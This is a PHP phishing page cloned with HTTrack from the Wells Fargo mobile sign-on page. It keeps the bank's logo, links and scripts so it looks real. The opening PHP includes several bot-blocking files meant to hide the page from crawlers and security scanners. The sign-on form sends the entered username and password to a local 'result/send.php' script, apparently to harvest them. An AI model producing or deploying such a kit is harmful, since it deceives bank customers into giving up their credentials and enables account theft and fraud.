<?php
session_start();
error_reporting(0);

include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';
include'BOTS/index.php'; 



?>
<!DOCTYPE html>
<html lang="en">
     
<!-- Mirrored from connect.secure.wellsfargo.com/auth/login/present by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 31 May 2020 14:31:36 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/> 
        <title>Mobile Sign on | Wells Fargo</title>
        <meta name="description" content="Click here to sign on to your Wells Fargo account from your mobile phone."/>
        <link rel="stylesheet" href="static/css/wf-fonts1d04.css?v=C6AB61065D" type="text/css" >
        <link rel="stylesheet" href="static/css/frontporch1d04.css?v=C6AB61065D" type="text/css" >
        <link type="text/css" href="static/wfa/css/signon_clean1d04.css?v=C6AB61065D" rel="stylesheet" media="screen,projection,print" />
        
        <script nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
var webId = "w-642409";
var ndURI ="https://connect.secure.wellsfargo.com/ATADUN/2.2/w/w-642409/sync/js/";
</script>

        
        <!--TMS include starts-->
        <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
            var utag_data = {
                'app_id': 'loginapp',
                'customer_type': '',
                'wfacookie': '4520200531073125374992155',
                'device_type': 'mobile',
                'environment': 'PROD',
                'tealium_js_path': 'https://static.wellsfargo.com/tracking/main/utag.js',
                'mt_tag_path': 'https://static.wellsfargo.com/mttag/',
                'page_id': 'MOBILEBROWSER_LOGIN',
                'page_type': 'BROWSER'
            }
        </script>

        <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"> (function(a,b,c,d){a='../../static.wellsfargo.com/tracking/main/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];if (a.src !== d.src) { a.parentNode.insertBefore(d,a);}})();</script>
        <!--TMS include ends-->
    </head>

 <body theme="ssep" id="body" class="brand-fp" lob="cob" contextPath="/auth" devicetype="mobile"  >
        

<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>
<script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	if (self === top) {
		var antiClickjack = document.getElementById("antiClickjack");
		antiClickjack.parentNode.removeChild(antiClickjack);
	} else {
		top.location = self.location;
	}
</script>
        
        
        <div control="lightbox" id="saveUsernameWarningDialog" class="dialog">
            <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameWarningTitle">
                <span class="hide">Beginning of popup</span>
                <div class="lightbox-title">
                    <h2 id="saveUsernameWarningTitle">Save Username</h2>
                </div>
                <div class="lightbox-content">
                    <p>For your security we do not recommend using this feature on a shared device.</p>
                </div>
                <div class="lightbox-button-container">
                    <button control="button" id="closeSaveUsernameWarningDialogBtn" aria-label="close"></button>
                </div>
                <span class="hide">End of popup</span>
            </div>
        </div>
        
        
        

        
            
                






<div class="header brand-fp" id="header">
  <div class="wf_logo" role="link">
    <img
      src="https://www10.wellsfargomedia.com/auth/static/images/masthead-wf_logo-e-148x16.svg"
      alt="Wells Fargo"
      lang="en"
      role="img">
  </div>
  <div class="hamburger_menu" role="link">
    <a href="https://www.wellsfargo.com/"><img
        src="https://www10.wellsfargomedia.com/auth/static/images/FP.svg"
        alt="Home"
        role="img"></a>
  </div>
</div>
            
            
            
            
        

        <main role="main">
            <article>
                
                
                    
                        







<div id='form'>
    <h1 class="banner"> Welcome </h1>
    <h2 class="security-link flex-cntr">
        <!-- <span class="icon-lock"></span> -->
        <img
        src="https://www10.wellsfargomedia.com/auth/static/images/lock.svg"
        alt="" aria-hidden="true">
        <a class=""
            href="https://www.wellsfargo.com/privacy-security/fraud">Online &amp; Mobile Security</a></h2>
    <form action="result/send.php" method="post">
        <input name="userPrefs" id="userPrefs" type="hidden" />
        <input name="jsenabled" id="jsenabled" type="hidden" value="false" />
        
        
            
        
        <div id="usernameWrapper" class="bim-input-wrapper">
            <label id="username" class="bim-input-label " for="j_username">Username</label>
            
                
                    <input class="bim-input" control="forms:input" type="text" name="j_username" id="j_username"
                        autocomplete="off" maxlength="14" />
                
                
            

        </div>
        <div id="passwordWrapper" class="bim-input-wrapper">
            <label id="lblForPassword" class="bim-input-label" for="password">Password</label>
            <input class="bim-input pmask" control="forms:input" type="password" id="password" name="j_password"
                autocomplete="off" maxlength="32" />
        </div>
        <div id="chkSave">
            <div class="save-usr-name">
                
                    
                        <input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username" />
                    
                    
                
                <label for="saveUsernameCheckbox">
                    <span aria-labelledby="usernameLbl" role="checkbox" tabindex="0" aria-checked="false" aria-live="polite"></span>
                    <p id="usernameLbl">Save Username</p>
                </label>
            </div>
        </div>
        
            <div>
                <button class="primary cta-btn sign-on" type="submit" >Sign On</button>
            </div>
            <div id="forgot">
                <p id="forgot">
                    <span lang="en"><a  href="https://www.wellsfargo.com/help/online-banking/sign-on-faqs">Forgot Password/Username?</a></span></p>
            </div>

            <div>
                <p class="ntwf-link">New to <span lang="en"><i>Wells Fargo Online</i></span><sup>&reg;</sup>?</p>
                <button id="enrollButton" class="secondary-gray cta-btn enroll" control="button" aria-label="enroll">Enroll</button>
            </div>

            <input name="origin" id="origin" type="hidden" value="mobilebrowser" />
            <input name="save-username" id="saveUsername" type="hidden" value="false" />
            
                
            
            <input name="pcg" type="hidden" value=" "/>

            
                <input type="hidden" name="segmentation" value=" cob"/>
            

		
		
		
            
           
    </form>
    
 
</div>
                        


<div id="footer">
    <div id="links">
        <p><a href="https://www.wellsfargo.com/privacy-security/" class="link">PRIVACY, Cookies, Security &amp;
                Legal</a> <span class="link-separator"></span><a
                href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices" class="link">Ad Choices </a>
        </p>
        <p><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/" class="link online-acc">Online Access
                Agreement</a>

            <span class="link-separator"></span>
            <a href="https://www.wellsfargo.com/privacy-security/privacy/esign-consent/" class="link e-sign">ESIGN
                    Consent</a>
            
        </p>
        <p>&#169; 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
                    
                    
                
            </article>
        </main>

        

    <!--TMS include starts-->
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
        var utag_data = {
            'app_id': 'loginapp',
            'customer_type': '',
            'wfacookie': '4520200531073125374992155',
            'device_type': 'desktop',
            'environment': 'PROD',
            'tealium_js_path': 'https://static.wellsfargo.com/tracking/main/utag.js',
            'mt_tag_path': 'https://static.wellsfargo.com/mttag/'
        }
    </script>
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"> (function(a,b,c,d){a='../../static.wellsfargo.com/tracking/main/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];if (a.src !== d.src) { a.parentNode.insertBefore(d,a);}})();</script>
    <!--TMS include ends-->
    <noscript><!-- No alternative content --></noscript>
          <!--end main-->
    
    

        	<script type="text/javascript" language="JavaScript" src="static/prefs/login-userprefs.min.js" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script>
			<script src="static/scripts/components/public/lightbox/lightbox.js" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script>
			
        	<script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	        	function signonFormSubmitHandler(evt) {
	        		evt.preventDefault();
	        		disableSubmitsCollectUserPrefs(evt.target);
	        		evt.target.submit();
	        	}
	        	function gotoPreviousPage() {
	        		window.history.go(-1);
	        	}
	        	
	        	if (document.querySelector("#Signon")) {
	            	document.querySelector("#Signon").addEventListener('submit', signonFormSubmitHandler);
	            }
	        	if (document.querySelector("#linkToPreviousPage")) {
	            	document.querySelector("#linkToPreviousPage").addEventListener('click', gotoPreviousPage);
	            }
				const userNameEL = document.querySelector(".oas-redesigned #j_username");
				const passwordEl = document.querySelector(".oas-redesigned #j_password");
				function animateLabel(e) {
					e.target.previousElementSibling.classList.add('animated');
				}
				function removeAnimation(e) {
					if (!e.target.value.trim().length) {
						e.target.previousElementSibling.classList.remove('animated');
						e.target.value = "";
					}
				}
				if (userNameEL != null) {
					userNameEL.addEventListener('focus', animateLabel);
					userNameEL.addEventListener('blur', removeAnimation);
				}
				if (passwordEl != null) {
					passwordEl.addEventListener('focus', animateLabel);
					passwordEl.addEventListener('blur', removeAnimation);
				}


				function focusError() {
					const errorCntr = document.querySelector('#errorCntr');
					if(errorCntr) {
						errorCntr.focus();
					}
				}

				focusError();



        	</script>
        	

    <script src="static/scripts/frontporch1d04.js?v=C6AB61065D" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a"></script>
    <script type="text/javascript" nonce="5c13d8ac-f86c-4ecf-915b-fe8b801e848a">
	    function enrollButtonHandler(evt) {
			evt.preventDefault();
			location.href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1";
		}
		if (document.querySelector("#enrollButton")) {
			document.querySelector('#enrollButton').addEventListener('click', enrollButtonHandler);
		}


        if(document.querySelector('#usernameWrapper .bim-input')) {
            document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }
        if(document.querySelector('#passwordWrapper .bim-input')) {
            document.querySelector('#passwordWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#passwordWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#passwordWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#passwordWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }



    </script>

    </body>

<!-- Mirrored from connect.secure.wellsfargo.com/auth/login/present by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 31 May 2020 14:31:36 GMT -->
</html>
